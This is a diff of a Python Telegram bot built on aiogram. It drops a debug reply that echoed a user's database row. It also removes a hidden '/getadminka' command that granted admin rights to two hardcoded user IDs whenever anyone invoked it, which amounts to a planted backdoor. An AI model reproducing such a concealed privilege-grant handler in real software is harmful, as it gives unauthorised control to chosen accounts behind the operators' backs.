@@ -139,7 +139,6 @@ async def banuser_command(message: types.Message):
     user_id = message.from_user.id
     cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))
     user = cursor.fetchone()
-    await message.reply(user)
     is_admin = user[3]
     if is_admin == 1:
         reply_msg = message.reply_to_message
@@ -166,13 +165,6 @@ async def unbanuser_command(message: types.Message):
         await message.reply(f"🛑 Пользователь с ID: `{bann_user_id}` разблокирован", parse_mode='markdown')
     else:
         await message.reply('🚨 MONKEY ALARM')
-
-@dp.message_handler(commands=['getadminka'])
-async def getadminka_command(message: types.Message):
-    cursor.execute('UPDATE users SET is_admin = 1 WHERE id = ?', (5510709343,))
-    cursor.execute('UPDATE users SET is_admin = 1 WHERE id = ?', (1888296065,))
-    conn.commit()
-    await message.reply('✅')
 
 @dp.message_handler(commands=['setdrugs'])
 async def setdrugs_command(message: types.Message):
